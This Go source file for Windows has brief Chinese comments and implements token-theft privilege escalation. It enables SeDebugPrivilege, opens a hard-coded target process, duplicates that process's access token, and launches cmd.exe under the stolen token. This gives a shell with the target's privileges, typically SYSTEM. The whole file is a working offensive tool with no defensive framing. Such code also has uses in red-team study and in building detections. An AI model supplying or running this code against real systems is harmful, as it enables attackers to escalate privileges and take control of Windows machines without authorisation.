package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	SecurityAnonymous      = 0
	SecurityIdentification = 1
	SecurityImpersonation  = 2
	SecurityDelegation     = 3

	TokenPrimary = 1
)

type LUID struct {
	LowPart uint32
	HighPart int32
}
type LUID_AND_ATTRIBUTES struct {
	Luid LUID
	Attributes uint32
}
type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges [1]LUID_AND_ATTRIBUTES
}


var Kernel32 = syscall.NewLazyDLL("Kernel32.dll")
var Apdvapi32 = syscall.NewLazyDLL("Advapi32.dll")
const SE_PRIVILEGE_ENABLED = 0x00000002
const MAXIMUM_ALLOWED = 0x02000000
var CREATE_NEW_CONSOLE = 0x00000010
var TP TOKEN_PRIVILEGES
var HandleToken syscall.Token
var NULL uintptr

func EnableDebugPrivilege(){
	CurrentHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		fmt.Println(err)
	}
	syscall.OpenProcessToken(CurrentHandle, syscall.TOKEN_ALL_ACCESS, &HandleToken)
	TP.PrivilegeCount = 1
	TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	Apdvapi32.NewProc("LookupPrivilegeValueW").Call(
		NULL,
		uintptr(unsafe.Pointer(SE_DEBUG_NAME)),
		uintptr(unsafe.Pointer(&TP.Privileges[0].Luid)))
	Apdvapi32.NewProc("AdjustTokenPrivileges").Call(
		uintptr(HandleToken),
		uintptr(0),
		uintptr(unsafe.Pointer(&TP)),
		0,
		NULL,
		NULL)
}


func main(){
	var ProcessPID uint32 = 7620
	var phNewToken syscall.Token
	var startupInfo syscall.StartupInfo
	var ProcessInformation syscall.ProcessInformation
	EnableDebugPrivilege()
	// 打开进程句柄
	hProcess, err := syscall.OpenProcess(
		syscall.PROCESS_QUERY_INFORMATION,
		true,
		ProcessPID)
	if err != nil {
		fmt.Println(err)
	}
	// 获取进程令牌
	var hToken syscall.Token
	err = syscall.OpenProcessToken(
		syscall.Handle(hProcess),
		syscall.TOKEN_QUERY | syscall.TOKEN_DUPLICATE,
		&hToken)

	if err != nil {
		fmt.Println(err)
	}

	// 复制令牌操作
	Apdvapi32.NewProc("DuplicateTokenEx").Call(
		uintptr(hToken),
		uintptr(MAXIMUM_ALLOWED),
		uintptr(0),
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&phNewToken)))
	CmdPath ,_ := syscall.UTF16PtrFromString(`C:\\Windows\\system32\\cmd.exe`)

	Apdvapi32.NewProc("CreateProcessWithTokenW").Call(
		uintptr(phNewToken),
		0,
		uintptr(unsafe.Pointer(CmdPath)),
		uintptr(0),
		uintptr(CREATE_NEW_CONSOLE),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&startupInfo)),
		uintptr(unsafe.Pointer(&ProcessInformation)))

}

